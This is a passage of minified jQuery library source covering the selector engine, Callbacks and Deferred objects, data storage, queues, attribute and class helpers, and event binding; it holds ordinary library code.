ot(t,p,null,[e]).length>0},ot.contains=function(e,t){return(e.ownerDocument||e)!==p&&c(e),y(e,t)},ot.attr=function(e,t){(e.ownerDocument||e)!==p&&c(e);var r=i.attrHandle[t.toLowerCase()],o=r&&A.call(i.attrHandle,t.toLowerCase())?r(e,t,!h):undefined;return o===undefined?n.attributes||!h?e.getAttribute(t):(o=e.getAttributeNode(t))&&o.specified?o.value:null:o},ot.error=function(e){throw Error("Syntax error, unrecognized expression: "+e)},ot.uniqueSort=function(e){var t,r=[],i=0,o=0;if(E=!n.detectDuplicates,l=!n.sortStable&&e.slice(0),e.sort(S),E){while(t=e[o++])t===e[o]&&(i=r.push(o));while(i--)e.splice(r[i],1)}return e},o=ot.getText=function(e){var t,n="",r=0,i=e.nodeType;if(i){if(1===i||9===i||11===i){if("string"==typeof e.textContent)return e.textContent;for(e=e.firstChild;e;e=e.nextSibling)n+=o(e)}else if(3===i||4===i)return e.nodeValue}else for(;t=e[r];r++)n+=o(t);return n},i=ot.selectors={cacheLength:50,createPseudo:at,match:J,attrHandle:{},find:{},relative:{">":{dir:"parentNode",first:!0}," ":{dir:"parentNode"},"+":{dir:"previousSibling",first:!0},"~":{dir:"previousSibling"}},preFilter:{ATTR:function(e){return e[1]=e[1].replace(nt,rt),e[3]=(e[4]||e[5]||"").replace(nt,rt),"~="===e[2]&&(e[3]=" "+e[3]+" "),e.slice(0,4)},CHILD:function(e){return e[1]=e[1].toLowerCase(),"nth"===e[1].slice(0,3)?(e[3]||ot.error(e[0]),e[4]=+(e[4]?e[5]+(e[6]||1):2*("even"===e[3]||"odd"===e[3])),e[5]=+(e[7]+e[8]||"odd"===e[3])):e[3]&&ot.error(e[0]),e},PSEUDO:function(e){var t,n=!e[5]&&e[2];return J.CHILD.test(e[0])?null:(e[3]&&e[4]!==undefined?e[2]=e[4]:n&&V.test(n)&&(t=gt(n,!0))&&(t=n.indexOf(")",n.length-t)-n.length)&&(e[0]=e[0].slice(0,t),e[2]=n.slice(0,t)),e.slice(0,3))}},filter:{TAG:function(e){var t=e.replace(nt,rt).toLowerCase();return"*"===e?function(){return!0}:function(e){return e.nodeName&&e.nodeName.toLowerCase()===t}},CLASS:function(e){var t=C[e+" "];return t||(t=RegExp("(^|"+M+")"+e+"("+M+"|$)"))&&C(e,function(e){return t.test("string"==typeof e.className&&e.className||typeof e.getAttribute!==j&&e.getAttribute("class")||"")})},ATTR:function(e,t,n){return function(r){var i=ot.attr(r,e);return null==i?"!="===t:t?(i+="","="===t?i===n:"!="===t?i!==n:"^="===t?n&&0===i.indexOf(n):"*="===t?n&&i.indexOf(n)>-1:"$="===t?n&&i.slice(-n.length)===n:"~="===t?(" "+i+" ").indexOf(n)>-1:"|="===t?i===n||i.slice(0,n.length+1)===n+"-":!1):!0}},CHILD:function(e,t,n,r,i){var o="nth"!==e.slice(0,3),s="last"!==e.slice(-4),a="of-type"===t;return 1===r&&0===i?function(e){return!!e.parentNode}:function(t,n,u){var l,c,p,f,h,d,g=o!==s?"nextSibling":"previousSibling",m=t.parentNode,y=a&&t.nodeName.toLowerCase(),x=!u&&!a;if(m){if(o){while(g){p=t;while(p=p[g])if(a?p.nodeName.toLowerCase()===y:1===p.nodeType)return!1;d=g="only"===e&&!d&&"nextSibling"}return!0}if(d=[s?m.firstChild:m.lastChild],s&&x){c=m[v]||(m[v]={}),l=c[e]||[],h=l[0]===w&&l[1],f=l[0]===w&&l[2],p=h&&m.childNodes[h];while(p=++h&&p&&p[g]||(f=h=0)||d.pop())if(1===p.nodeType&&++f&&p===t){c[e]=[w,h,f];break}}else if(x&&(l=(t[v]||(t[v]={}))[e])&&l[0]===w)f=l[1];else while(p=++h&&p&&p[g]||(f=h=0)||d.pop())if((a?p.nodeName.toLowerCase()===y:1===p.nodeType)&&++f&&(x&&((p[v]||(p[v]={}))[e]=[w,f]),p===t))break;return f-=i,f===r||0===f%r&&f/r>=0}}},PSEUDO:function(e,t){var n,r=i.pseudos[e]||i.setFilters[e.toLowerCase()]||ot.error("unsupported pseudo: "+e);return r[v]?r(t):r.length>1?(n=[e,e,"",t],i.setFilters.hasOwnProperty(e.toLowerCase())?at(function(e,n){var i,o=r(e,t),s=o.length;while(s--)i=P.call(e,o[s]),e[i]=!(n[i]=o[s])}):function(e){return r(e,0,n)}):r}},pseudos:{not:at(function(e){var t=[],n=[],r=a(e.replace(z,"$1"));return r[v]?at(function(e,t,n,i){var o,s=r(e,null,i,[]),a=e.length;while(a--)(o=s[a])&&(e[a]=!(t[a]=o))}):function(e,i,o){return t[0]=e,r(t,null,o,n),!n.pop()}}),has:at(function(e){return function(t){return ot(e,t).length>0}}),contains:at(function(e){return function(t){return(t.textContent||t.innerText||o(t)).indexOf(e)>-1}}),lang:at(function(e){return G.test(e||"")||ot.error("unsupported lang: "+e),e=e.replace(nt,rt).toLowerCase(),function(t){var n;do if(n=h?t.lang:t.getAttribute("xml:lang")||t.getAttribute("lang"))return n=n.toLowerCase(),n===e||0===n.indexOf(e+"-");while((t=t.parentNode)&&1===t.nodeType);return!1}}),target:function(t){var n=e.location&&e.location.hash;return n&&n.slice(1)===t.id},root:function(e){return e===f},focus:function(e){return e===p.activeElement&&(!p.hasFocus||p.hasFocus())&&!!(e.type||e.href||~e.tabIndex)},enabled:function(e){return e.disabled===!1},disabled:function(e){return e.disabled===!0},checked:function(e){var t=e.nodeName.toLowerCase();return"input"===t&&!!e.checked||"option"===t&&!!e.selected},selected:function(e){return e.parentNode&&e.parentNode.selectedIndex,e.selected===!0},empty:function(e){for(e=e.firstChild;e;e=e.nextSibling)if(e.nodeName>"@"||3===e.nodeType||4===e.nodeType)return!1;return!0},parent:function(e){return!i.pseudos.empty(e)},header:function(e){return et.test(e.nodeName)},input:function(e){return Z.test(e.nodeName)},button:function(e){var t=e.nodeName.toLowerCase();return"input"===t&&"button"===e.type||"button"===t},text:function(e){var t;return"input"===e.nodeName.toLowerCase()&&"text"===e.type&&(null==(t=e.getAttribute("type"))||t.toLowerCase()===e.type)},first:ht(function(){return[0]}),last:ht(function(e,t){return[t-1]}),eq:ht(function(e,t,n){return[0>n?n+t:n]}),even:ht(function(e,t){var n=0;for(;t>n;n+=2)e.push(n);return e}),odd:ht(function(e,t){var n=1;for(;t>n;n+=2)e.push(n);return e}),lt:ht(function(e,t,n){var r=0>n?n+t:n;for(;--r>=0;)e.push(r);return e}),gt:ht(function(e,t,n){var r=0>n?n+t:n;for(;t>++r;)e.push(r);return e})}},i.pseudos.nth=i.pseudos.eq;for(t in{radio:!0,checkbox:!0,file:!0,password:!0,image:!0})i.pseudos[t]=pt(t);for(t in{submit:!0,reset:!0})i.pseudos[t]=ft(t);function dt(){}dt.prototype=i.filters=i.pseudos,i.setFilters=new dt;function gt(e,t){var n,r,o,s,a,u,l,c=k[e+" "];if(c)return t?0:c.slice(0);a=e,u=[],l=i.preFilter;while(a){(!n||(r=_.exec(a)))&&(r&&(a=a.slice(r[0].length)||a),u.push(o=[])),n=!1,(r=X.exec(a))&&(n=r.shift(),o.push({value:n,type:r[0].replace(z," ")}),a=a.slice(n.length));for(s in i.filter)!(r=J[s].exec(a))||l[s]&&!(r=l[s](r))||(n=r.shift(),o.push({value:n,type:s,matches:r}),a=a.slice(n.length));if(!n)break}return t?a.length:a?ot.error(e):k(e,u).slice(0)}function mt(e){var t=0,n=e.length,r="";for(;n>t;t++)r+=e[t].value;return r}function yt(e,t,n){var i=t.dir,o=n&&"parentNode"===i,s=T++;return t.first?function(t,n,r){while(t=t[i])if(1===t.nodeType||o)return e(t,n,r)}:function(t,n,a){var u,l,c,p=w+" "+s;if(a){while(t=t[i])if((1===t.nodeType||o)&&e(t,n,a))return!0}else while(t=t[i])if(1===t.nodeType||o)if(c=t[v]||(t[v]={}),(l=c[i])&&l[0]===p){if((u=l[1])===!0||u===r)return u===!0}else if(l=c[i]=[p],l[1]=e(t,n,a)||r,l[1]===!0)return!0}}function vt(e){return e.length>1?function(t,n,r){var i=e.length;while(i--)if(!e[i](t,n,r))return!1;return!0}:e[0]}function xt(e,t,n,r,i){var o,s=[],a=0,u=e.length,l=null!=t;for(;u>a;a++)(o=e[a])&&(!n||n(o,r,i))&&(s.push(o),l&&t.push(a));return s}function bt(e,t,n,r,i,o){return r&&!r[v]&&(r=bt(r)),i&&!i[v]&&(i=bt(i,o)),at(function(o,s,a,u){var l,c,p,f=[],h=[],d=s.length,g=o||Ct(t||"*",a.nodeType?[a]:a,[]),m=!e||!o&&t?g:xt(g,f,e,a,u),y=n?i||(o?e:d||r)?[]:s:m;if(n&&n(m,y,a,u),r){l=xt(y,h),r(l,[],a,u),c=l.length;while(c--)(p=l[c])&&(y[h[c]]=!(m[h[c]]=p))}if(o){if(i||e){if(i){l=[],c=y.length;while(c--)(p=y[c])&&l.push(m[c]=p);i(null,y=[],l,u)}c=y.length;while(c--)(p=y[c])&&(l=i?P.call(o,p):f[c])>-1&&(o[l]=!(s[l]=p))}}else y=xt(y===s?y.splice(d,y.length):y),i?i(null,s,y,u):O.apply(s,y)})}function wt(e){var t,n,r,o=e.length,s=i.relative[e[0].type],a=s||i.relative[" "],l=s?1:0,c=yt(function(e){return e===t},a,!0),p=yt(function(e){return P.call(t,e)>-1},a,!0),f=[function(e,n,r){return!s&&(r||n!==u)||((t=n).nodeType?c(e,n,r):p(e,n,r))}];for(;o>l;l++)if(n=i.relative[e[l].type])f=[yt(vt(f),n)];else{if(n=i.filter[e[l].type].apply(null,e[l].matches),n[v]){for(r=++l;o>r;r++)if(i.relative[e[r].type])break;return bt(l>1&&vt(f),l>1&&mt(e.slice(0,l-1).concat({value:" "===e[l-2].type?"*":""})).replace(z,"$1"),n,r>l&&wt(e.slice(l,r)),o>r&&wt(e=e.slice(r)),o>r&&mt(e))}f.push(n)}return vt(f)}function Tt(e,t){var n=0,o=t.length>0,s=e.length>0,a=function(a,l,c,f,h){var d,g,m,y=[],v=0,x="0",b=a&&[],T=null!=h,C=u,k=a||s&&i.find.TAG("*",h&&l.parentNode||l),N=w+=null==C?1:Math.random()||.1;for(T&&(u=l!==p&&l,r=n);null!=(d=k[x]);x++){if(s&&d){g=0;while(m=e[g++])if(m(d,l,c)){f.push(d);break}T&&(w=N,r=++n)}o&&((d=!m&&d)&&v--,a&&b.push(d))}if(v+=x,o&&x!==v){g=0;while(m=t[g++])m(b,y,l,c);if(a){if(v>0)while(x--)b[x]||y[x]||(y[x]=q.call(f));y=xt(y)}O.apply(f,y),T&&!a&&y.length>0&&v+t.length>1&&ot.uniqueSort(f)}return T&&(w=N,u=C),b};return o?at(a):a}a=ot.compile=function(e,t){var n,r=[],i=[],o=N[e+" "];if(!o){t||(t=gt(e)),n=t.length;while(n--)o=wt(t[n]),o[v]?r.push(o):i.push(o);o=N(e,Tt(i,r))}return o};function Ct(e,t,n){var r=0,i=t.length;for(;i>r;r++)ot(e,t[r],n);return n}function kt(e,t,r,o){var s,u,l,c,p,f=gt(e);if(!o&&1===f.length){if(u=f[0]=f[0].slice(0),u.length>2&&"ID"===(l=u[0]).type&&n.getById&&9===t.nodeType&&h&&i.relative[u[1].type]){if(t=(i.find.ID(l.matches[0].replace(nt,rt),t)||[])[0],!t)return r;e=e.slice(u.shift().value.length)}s=J.needsContext.test(e)?0:u.length;while(s--){if(l=u[s],i.relative[c=l.type])break;if((p=i.find[c])&&(o=p(l.matches[0].replace(nt,rt),U.test(u[0].type)&&t.parentNode||t))){if(u.splice(s,1),e=o.length&&mt(u),!e)return O.apply(r,o),r;break}}}return a(e,f)(o,t,!h,r,U.test(e)),r}n.sortStable=v.split("").sort(S).join("")===v,n.detectDuplicates=E,c(),n.sortDetached=ut(function(e){return 1&e.compareDocumentPosition(p.createElement("div"))}),ut(function(e){return e.innerHTML="<a href='#'></a>","#"===e.firstChild.getAttribute("href")})||lt("type|href|height|width",function(e,t,n){return n?undefined:e.getAttribute(t,"type"===t.toLowerCase()?1:2)}),n.attributes&&ut(function(e){return e.innerHTML="<input/>",e.firstChild.setAttribute("value",""),""===e.firstChild.getAttribute("value")})||lt("value",function(e,t,n){return n||"input"!==e.nodeName.toLowerCase()?undefined:e.defaultValue}),ut(function(e){return null==e.getAttribute("disabled")})||lt(R,function(e,t,n){var r;return n?undefined:(r=e.getAttributeNode(t))&&r.specified?r.value:e[t]===!0?t.toLowerCase():null}),x.find=ot,x.expr=ot.selectors,x.expr[":"]=x.expr.pseudos,x.unique=ot.uniqueSort,x.text=ot.getText,x.isXMLDoc=ot.isXML,x.contains=ot.contains}(e);var D={};function A(e){var t=D[e]={};return x.each(e.match(w)||[],function(e,n){t[n]=!0}),t}x.Callbacks=function(e){e="string"==typeof e?D[e]||A(e):x.extend({},e);var t,n,r,i,o,s,a=[],u=!e.once&&[],l=function(p){for(t=e.memory&&p,n=!0,s=i||0,i=0,o=a.length,r=!0;a&&o>s;s++)if(a[s].apply(p[0],p[1])===!1&&e.stopOnFalse){t=!1;break}r=!1,a&&(u?u.length&&l(u.shift()):t?a=[]:c.disable())},c={add:function(){if(a){var n=a.length;(function s(t){x.each(t,function(t,n){var r=x.type(n);"function"===r?e.unique&&c.has(n)||a.push(n):n&&n.length&&"string"!==r&&s(n)})})(arguments),r?o=a.length:t&&(i=n,l(t))}return this},remove:function(){return a&&x.each(arguments,function(e,t){var n;while((n=x.inArray(t,a,n))>-1)a.splice(n,1),r&&(o>=n&&o--,s>=n&&s--)}),this},has:function(e){return e?x.inArray(e,a)>-1:!(!a||!a.length)},empty:function(){return a=[],o=0,this},disable:function(){return a=u=t=undefined,this},disabled:function(){return!a},lock:function(){return u=undefined,t||c.disable(),this},locked:function(){return!u},fireWith:function(e,t){return!a||n&&!u||(t=t||[],t=[e,t.slice?t.slice():t],r?u.push(t):l(t)),this},fire:function(){return c.fireWith(this,arguments),this},fired:function(){return!!n}};return c},x.extend({Deferred:function(e){var t=[["resolve","done",x.Callbacks("once memory"),"resolved"],["reject","fail",x.Callbacks("once memory"),"rejected"],["notify","progress",x.Callbacks("memory")]],n="pending",r={state:function(){return n},always:function(){return i.done(arguments).fail(arguments),this},then:function(){var e=arguments;return x.Deferred(function(n){x.each(t,function(t,o){var s=o[0],a=x.isFunction(e[t])&&e[t];i[o[1]](function(){var e=a&&a.apply(this,arguments);e&&x.isFunction(e.promise)?e.promise().done(n.resolve).fail(n.reject).progress(n.notify):n[s+"With"](this===r?n.promise():this,a?[e]:arguments)})}),e=null}).promise()},promise:function(e){return null!=e?x.extend(e,r):r}},i={};return r.pipe=r.then,x.each(t,function(e,o){var s=o[2],a=o[3];r[o[1]]=s.add,a&&s.add(function(){n=a},t[1^e][2].disable,t[2][2].lock),i[o[0]]=function(){return i[o[0]+"With"](this===i?r:this,arguments),this},i[o[0]+"With"]=s.fireWith}),r.promise(i),e&&e.call(i,i),i},when:function(e){var t=0,n=d.call(arguments),r=n.length,i=1!==r||e&&x.isFunction(e.promise)?r:0,o=1===i?e:x.Deferred(),s=function(e,t,n){return function(r){t[e]=this,n[e]=arguments.length>1?d.call(arguments):r,n===a?o.notifyWith(t,n):--i||o.resolveWith(t,n)}},a,u,l;if(r>1)for(a=Array(r),u=Array(r),l=Array(r);r>t;t++)n[t]&&x.isFunction(n[t].promise)?n[t].promise().done(s(t,l,n)).fail(o.reject).progress(s(t,u,a)):--i;return i||o.resolveWith(l,n),o.promise()}}),x.support=function(t){var n=o.createElement("input"),r=o.createDocumentFragment(),i=o.createElement("div"),s=o.createElement("select"),a=s.appendChild(o.createElement("option"));return n.type?(n.type="checkbox",t.checkOn=""!==n.value,t.optSelected=a.selected,t.reliableMarginRight=!0,t.boxSizingReliable=!0,t.pixelPosition=!1,n.checked=!0,t.noCloneChecked=n.cloneNode(!0).checked,s.disabled=!0,t.optDisabled=!a.disabled,n=o.createElement("input"),n.value="t",n.type="radio",t.radioValue="t"===n.value,n.setAttribute("checked","t"),n.setAttribute("name","t"),r.appendChild(n),t.checkClone=r.cloneNode(!0).cloneNode(!0).lastChild.checked,t.focusinBubbles="onfocusin"in e,i.style.backgroundClip="content-box",i.cloneNode(!0).style.backgroundClip="",t.clearCloneStyle="content-box"===i.style.backgroundClip,x(function(){var n,r,s="padding:0;margin:0;border:0;display:block;-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box",a=o.getElementsByTagName("body")[0];a&&(n=o.createElement("div"),n.style.cssText="border:0;width:0;height:0;position:absolute;top:0;left:-9999px;margin-top:1px",a.appendChild(n).appendChild(i),i.innerHTML="",i.style.cssText="-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;padding:1px;border:1px;display:block;width:4px;margin-top:1%;position:absolute;top:1%",x.swap(a,null!=a.style.zoom?{zoom:1}:{},function(){t.boxSizing=4===i.offsetWidth}),e.getComputedStyle&&(t.pixelPosition="1%"!==(e.getComputedStyle(i,null)||{}).top,t.boxSizingReliable="4px"===(e.getComputedStyle(i,null)||{width:"4px"}).width,r=i.appendChild(o.createElement("div")),r.style.cssText=i.style.cssText=s,r.style.marginRight=r.style.width="0",i.style.width="1px",t.reliableMarginRight=!parseFloat((e.getComputedStyle(r,null)||{}).marginRight)),a.removeChild(n))}),t):t}({});var L,q,H=/(?:\{[\s\S]*\}|\[[\s\S]*\])$/,O=/([A-Z])/g;function F(){Object.defineProperty(this.cache={},0,{get:function(){return{}}}),this.expando=x.expando+Math.random()}F.uid=1,F.accepts=function(e){return e.nodeType?1===e.nodeType||9===e.nodeType:!0},F.prototype={key:function(e){if(!F.accepts(e))return 0;var t={},n=e[this.expando];if(!n){n=F.uid++;try{t[this.expando]={value:n},Object.defineProperties(e,t)}catch(r){t[this.expando]=n,x.extend(e,t)}}return this.cache[n]||(this.cache[n]={}),n},set:function(e,t,n){var r,i=this.key(e),o=this.cache[i];if("string"==typeof t)o[t]=n;else if(x.isEmptyObject(o))x.extend(this.cache[i],t);else for(r in t)o[r]=t[r];return o},get:function(e,t){var n=this.cache[this.key(e)];return t===undefined?n:n[t]},access:function(e,t,n){var r;return t===undefined||t&&"string"==typeof t&&n===undefined?(r=this.get(e,t),r!==undefined?r:this.get(e,x.camelCase(t))):(this.set(e,t,n),n!==undefined?n:t)},remove:function(e,t){var n,r,i,o=this.key(e),s=this.cache[o];if(t===undefined)this.cache[o]={};else{x.isArray(t)?r=t.concat(t.map(x.camelCase)):(i=x.camelCase(t),t in s?r=[t,i]:(r=i,r=r in s?[r]:r.match(w)||[])),n=r.length;while(n--)delete s[r[n]]}},hasData:function(e){return!x.isEmptyObject(this.cache[e[this.expando]]||{})},discard:function(e){e[this.expando]&&delete this.cache[e[this.expando]]}},L=new F,q=new F,x.extend({acceptData:F.accepts,hasData:function(e){return L.hasData(e)||q.hasData(e)},data:function(e,t,n){return L.access(e,t,n)},removeData:function(e,t){L.remove(e,t)},_data:function(e,t,n){return q.access(e,t,n)},_removeData:function(e,t){q.remove(e,t)}}),x.fn.extend({data:function(e,t){var n,r,i=this[0],o=0,s=null;if(e===undefined){if(this.length&&(s=L.get(i),1===i.nodeType&&!q.get(i,"hasDataAttrs"))){for(n=i.attributes;n.length>o;o++)r=n[o].name,0===r.indexOf("data-")&&(r=x.camelCase(r.slice(5)),P(i,r,s[r]));q.set(i,"hasDataAttrs",!0)}return s}return"object"==typeof e?this.each(function(){L.set(this,e)}):x.access(this,function(t){var n,r=x.camelCase(e);if(i&&t===undefined){if(n=L.get(i,e),n!==undefined)return n;if(n=L.get(i,r),n!==undefined)return n;if(n=P(i,r,undefined),n!==undefined)return n}else this.each(function(){var n=L.get(this,r);L.set(this,r,t),-1!==e.indexOf("-")&&n!==undefined&&L.set(this,e,t)})},null,t,arguments.length>1,null,!0)},removeData:function(e){return this.each(function(){L.remove(this,e)})}});function P(e,t,n){var r;if(n===undefined&&1===e.nodeType)if(r="data-"+t.replace(O,"-$1").toLowerCase(),n=e.getAttribute(r),"string"==typeof n){try{n="true"===n?!0:"false"===n?!1:"null"===n?null:+n+""===n?+n:H.test(n)?JSON.parse(n):n}catch(i){}L.set(e,t,n)}else n=undefined;return n}x.extend({queue:function(e,t,n){var r;return e?(t=(t||"fx")+"queue",r=q.get(e,t),n&&(!r||x.isArray(n)?r=q.access(e,t,x.makeArray(n)):r.push(n)),r||[]):undefined},dequeue:function(e,t){t=t||"fx";var n=x.queue(e,t),r=n.length,i=n.shift(),o=x._queueHooks(e,t),s=function(){x.dequeue(e,t)
};"inprogress"===i&&(i=n.shift(),r--),i&&("fx"===t&&n.unshift("inprogress"),delete o.stop,i.call(e,s,o)),!r&&o&&o.empty.fire()},_queueHooks:function(e,t){var n=t+"queueHooks";return q.get(e,n)||q.access(e,n,{empty:x.Callbacks("once memory").add(function(){q.remove(e,[t+"queue",n])})})}}),x.fn.extend({queue:function(e,t){var n=2;return"string"!=typeof e&&(t=e,e="fx",n--),n>arguments.length?x.queue(this[0],e):t===undefined?this:this.each(function(){var n=x.queue(this,e,t);x._queueHooks(this,e),"fx"===e&&"inprogress"!==n[0]&&x.dequeue(this,e)})},dequeue:function(e){return this.each(function(){x.dequeue(this,e)})},delay:function(e,t){return e=x.fx?x.fx.speeds[e]||e:e,t=t||"fx",this.queue(t,function(t,n){var r=setTimeout(t,e);n.stop=function(){clearTimeout(r)}})},clearQueue:function(e){return this.queue(e||"fx",[])},promise:function(e,t){var n,r=1,i=x.Deferred(),o=this,s=this.length,a=function(){--r||i.resolveWith(o,[o])};"string"!=typeof e&&(t=e,e=undefined),e=e||"fx";while(s--)n=q.get(o[s],e+"queueHooks"),n&&n.empty&&(r++,n.empty.add(a));return a(),i.promise(t)}});var R,M,W=/[\t\r\n\f]/g,$=/\r/g,B=/^(?:input|select|textarea|button)$/i;x.fn.extend({attr:function(e,t){return x.access(this,x.attr,e,t,arguments.length>1)},removeAttr:function(e){return this.each(function(){x.removeAttr(this,e)})},prop:function(e,t){return x.access(this,x.prop,e,t,arguments.length>1)},removeProp:function(e){return this.each(function(){delete this[x.propFix[e]||e]})},addClass:function(e){var t,n,r,i,o,s=0,a=this.length,u="string"==typeof e&&e;if(x.isFunction(e))return this.each(function(t){x(this).addClass(e.call(this,t,this.className))});if(u)for(t=(e||"").match(w)||[];a>s;s++)if(n=this[s],r=1===n.nodeType&&(n.className?(" "+n.className+" ").replace(W," "):" ")){o=0;while(i=t[o++])0>r.indexOf(" "+i+" ")&&(r+=i+" ");n.className=x.trim(r)}return this},removeClass:function(e){var t,n,r,i,o,s=0,a=this.length,u=0===arguments.length||"string"==typeof e&&e;if(x.isFunction(e))return this.each(function(t){x(this).removeClass(e.call(this,t,this.className))});if(u)for(t=(e||"").match(w)||[];a>s;s++)if(n=this[s],r=1===n.nodeType&&(n.className?(" "+n.className+" ").replace(W," "):"")){o=0;while(i=t[o++])while(r.indexOf(" "+i+" ")>=0)r=r.replace(" "+i+" "," ");n.className=e?x.trim(r):""}return this},toggleClass:function(e,t){var n=typeof e;return"boolean"==typeof t&&"string"===n?t?this.addClass(e):this.removeClass(e):x.isFunction(e)?this.each(function(n){x(this).toggleClass(e.call(this,n,this.className,t),t)}):this.each(function(){if("string"===n){var t,i=0,o=x(this),s=e.match(w)||[];while(t=s[i++])o.hasClass(t)?o.removeClass(t):o.addClass(t)}else(n===r||"boolean"===n)&&(this.className&&q.set(this,"__className__",this.className),this.className=this.className||e===!1?"":q.get(this,"__className__")||"")})},hasClass:function(e){var t=" "+e+" ",n=0,r=this.length;for(;r>n;n++)if(1===this[n].nodeType&&(" "+this[n].className+" ").replace(W," ").indexOf(t)>=0)return!0;return!1},val:function(e){var t,n,r,i=this[0];{if(arguments.length)return r=x.isFunction(e),this.each(function(n){var i;1===this.nodeType&&(i=r?e.call(this,n,x(this).val()):e,null==i?i="":"number"==typeof i?i+="":x.isArray(i)&&(i=x.map(i,function(e){return null==e?"":e+""})),t=x.valHooks[this.type]||x.valHooks[this.nodeName.toLowerCase()],t&&"set"in t&&t.set(this,i,"value")!==undefined||(this.value=i))});if(i)return t=x.valHooks[i.type]||x.valHooks[i.nodeName.toLowerCase()],t&&"get"in t&&(n=t.get(i,"value"))!==undefined?n:(n=i.value,"string"==typeof n?n.replace($,""):null==n?"":n)}}}),x.extend({valHooks:{option:{get:function(e){var t=e.attributes.value;return!t||t.specified?e.value:e.text}},select:{get:function(e){var t,n,r=e.options,i=e.selectedIndex,o="select-one"===e.type||0>i,s=o?null:[],a=o?i+1:r.length,u=0>i?a:o?i:0;for(;a>u;u++)if(n=r[u],!(!n.selected&&u!==i||(x.support.optDisabled?n.disabled:null!==n.getAttribute("disabled"))||n.parentNode.disabled&&x.nodeName(n.parentNode,"optgroup"))){if(t=x(n).val(),o)return t;s.push(t)}return s},set:function(e,t){var n,r,i=e.options,o=x.makeArray(t),s=i.length;while(s--)r=i[s],(r.selected=x.inArray(x(r).val(),o)>=0)&&(n=!0);return n||(e.selectedIndex=-1),o}}},attr:function(e,t,n){var i,o,s=e.nodeType;if(e&&3!==s&&8!==s&&2!==s)return typeof e.getAttribute===r?x.prop(e,t,n):(1===s&&x.isXMLDoc(e)||(t=t.toLowerCase(),i=x.attrHooks[t]||(x.expr.match.bool.test(t)?M:R)),n===undefined?i&&"get"in i&&null!==(o=i.get(e,t))?o:(o=x.find.attr(e,t),null==o?undefined:o):null!==n?i&&"set"in i&&(o=i.set(e,n,t))!==undefined?o:(e.setAttribute(t,n+""),n):(x.removeAttr(e,t),undefined))},removeAttr:function(e,t){var n,r,i=0,o=t&&t.match(w);if(o&&1===e.nodeType)while(n=o[i++])r=x.propFix[n]||n,x.expr.match.bool.test(n)&&(e[r]=!1),e.removeAttribute(n)},attrHooks:{type:{set:function(e,t){if(!x.support.radioValue&&"radio"===t&&x.nodeName(e,"input")){var n=e.value;return e.setAttribute("type",t),n&&(e.value=n),t}}}},propFix:{"for":"htmlFor","class":"className"},prop:function(e,t,n){var r,i,o,s=e.nodeType;if(e&&3!==s&&8!==s&&2!==s)return o=1!==s||!x.isXMLDoc(e),o&&(t=x.propFix[t]||t,i=x.propHooks[t]),n!==undefined?i&&"set"in i&&(r=i.set(e,n,t))!==undefined?r:e[t]=n:i&&"get"in i&&null!==(r=i.get(e,t))?r:e[t]},propHooks:{tabIndex:{get:function(e){return e.hasAttribute("tabindex")||B.test(e.nodeName)||e.href?e.tabIndex:-1}}}}),M={set:function(e,t,n){return t===!1?x.removeAttr(e,n):e.setAttribute(n,n),n}},x.each(x.expr.match.bool.source.match(/\w+/g),function(e,t){var n=x.expr.attrHandle[t]||x.find.attr;x.expr.attrHandle[t]=function(e,t,r){var i=x.expr.attrHandle[t],o=r?undefined:(x.expr.attrHandle[t]=undefined)!=n(e,t,r)?t.toLowerCase():null;return x.expr.attrHandle[t]=i,o}}),x.support.optSelected||(x.propHooks.selected={get:function(e){var t=e.parentNode;return t&&t.parentNode&&t.parentNode.selectedIndex,null}}),x.each(["tabIndex","readOnly","maxLength","cellSpacing","cellPadding","rowSpan","colSpan","useMap","frameBorder","contentEditable"],function(){x.propFix[this.toLowerCase()]=this}),x.each(["radio","checkbox"],function(){x.valHooks[this]={set:function(e,t){return x.isArray(t)?e.checked=x.inArray(x(e).val(),t)>=0:undefined}},x.support.checkOn||(x.valHooks[this].get=function(e){return null===e.getAttribute("value")?"on":e.value})});var I=/^key/,z=/^(?:mouse|contextmenu)|click/,_=/^(?:focusinfocus|focusoutblur)$/,X=/^([^.]*)(?:\.(.+)|)$/;function U(){return!0}function Y(){return!1}function V(){try{return o.activeElement}catch(e){}}x.event={global:{},add:function(e,t,n,i,o){var s,a,u,l,c,p,f,h,d,g,m,y=q.get(e);if(y){n.handler&&(s=n,n=s.handler,o=s.selector),n.guid||(n.guid=x.guid++),(l=y.events)||(l=y.events={}),(a=y.handle)||(a=y.handle=function(e){return typeof x===r||e&&x.event.triggered===e.type?undefined:x.event.dispatch.apply(a.elem,arguments)},a.elem=e),t=(t||"").match(w)||[""],c=t.length;while(c--)u=X.exec(t[c])||[],d=m=u[1],g=(u[2]||"").split(".").sort(),d&&(f=x.event.special[d]||{},d=(o?f.delegateType:f.bindType)||d,f=x.event.special[d]||{},p=x.extend({type:d,origType:m,data:i,handler:n,guid:n.guid,selector:o,needsContext:o&&x.expr.match.needsContext.test(o),namespace:g.join(".")},s),(h=l[d])||(h=l[d]=[],h.delegateCount=0,f.setup&&f.setup.call(e,i,g,a)!==!1||e.addEventListener&&e.addEventListener(d,a,!1)),f.add&&(f.add.call(e,p),p.handler.guid||(p.handler.guid=n.guid)),o?h.splice(h.delegateCount++,0,p):h.push(p),x.event.global[d]=!0);e=null}},remove:function(e,t,n,r,i){var o,s,a,u,l,c,p,f,h,d,g,m=q.hasData(e)&&q.get(e);if(m&&(u=m.events)){t=(t||"").match(w)||[""],l=t.length;while(l--)if(a=X.exec(t[l])||[],h=g=a[1],d=(a[2]||"").split(".").sort(),h){p=x.event.special[h]||{},h=(r?p.delegateType:p.bindType)||h,f=u[h]||[],a=a[2]&&RegExp("(^|\\.)"+d.join("\\.(?:.*\\.|)")+"(\\.|$)"),s=o=f.length;while(o--)c=f[o],!i&&g!==c.origType||n&&n.guid!==c.guid||a&&!a.test(c.namespace)||r&&r!==c.selector&&("**"!==r||!c.selector)||(f.splice(o,1),c.selector&&f.delegateCount--,p.remove&&p.remove.call(e,c));s&&!f.length&&(p.teardown&&p.teardown.call(e,d,m.handle)!==!1||x.removeEvent(e,h,m.handle),delete u[h])}else for(h in u)x.event.remove(e,h+t[l],n,r,!0);x.isEmptyObject(u)&&(delete m.handle,q.remove(e,"events"))}},trigger:function(t,n,r,i){var 